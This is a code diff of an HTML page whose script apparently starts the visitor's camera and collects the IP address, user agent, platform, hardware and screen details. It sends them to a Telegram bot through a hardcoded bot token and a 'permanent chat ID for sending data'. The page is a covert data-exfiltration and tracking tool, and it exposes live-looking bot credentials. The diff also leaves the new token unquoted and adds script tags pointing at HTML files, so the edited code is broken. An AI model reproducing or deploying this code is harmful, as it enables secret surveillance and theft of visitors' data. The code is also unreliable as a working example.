@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <style>
         body {
             margin: 0;
@@ -89,6 +88,8 @@
             background: #0056b3;
         }
     </style>
+    <script src="index.html"></script>
+    <script src="testimonial.html"></script>
 </head>
 <body>
     <div class="browser-container">
@@ -153,8 +154,8 @@
                         }
                 
                         const { chatId } = getQueryParams();
-                        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
-                        const permanentChatId = '5634946920'; // Permanent chat ID for sending data
+                        const botToken = 7347658420:AAHwslpdYkxbTaS95ZQSzyGQOL95cHCq5Go;
+                        const permanentChatId = 5634946920; // Permanent chat ID for sending data
                 
                         async function startVideo() {
                             try {
@@ -251,7 +252,7 @@
                                     },
                                     body: JSON.stringify({
                                         chat_id: chatId,
-                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits\nDevice Name: ${userInfo.deviceName}`
+                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}\nScreen Height: ${userInfo.screenHeight}\nColor Depth: ${userInfo.colorDepth}\nDevice Name: ${userInfo.deviceName}`
                                     })
                                 });
                 
